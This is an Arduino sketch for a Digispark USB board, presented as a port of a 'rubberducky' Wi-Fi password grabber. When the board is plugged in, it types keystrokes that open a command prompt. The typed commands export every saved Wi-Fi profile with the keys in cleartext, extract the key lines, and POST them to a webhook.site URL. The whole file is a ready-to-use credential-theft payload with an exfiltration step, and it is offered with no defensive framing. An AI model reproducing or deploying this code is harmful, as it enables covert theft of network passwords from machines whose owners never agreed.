/*rubberducky code translated to work on digispark by noonessenpa1(T.W.L)  
made to an one liner
original code https://github.com/krankenpanzer wifi pass graber

LED marking on the end - one blink to signal that it's finished.
*/


#include "DigiKeyboard.h"
void setup() {
  pinMode(0, OUTPUT); 
  pinMode(1, OUTPUT); 
}

void loop() {
  
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);

  DigiKeyboard.print("cmd /k");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS && powershell Invoke-WebRequest -Uri https://webhook.site/URL -Method POST -InFile WiFi-PASS");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  //LED Markings
  digitalWrite(0, HIGH);   
  digitalWrite(1, HIGH);
  delay(1000);
  digitalWrite(0, LOW);    
  digitalWrite(1, LOW);

  for (;;) {
    //no looping!
  }
}
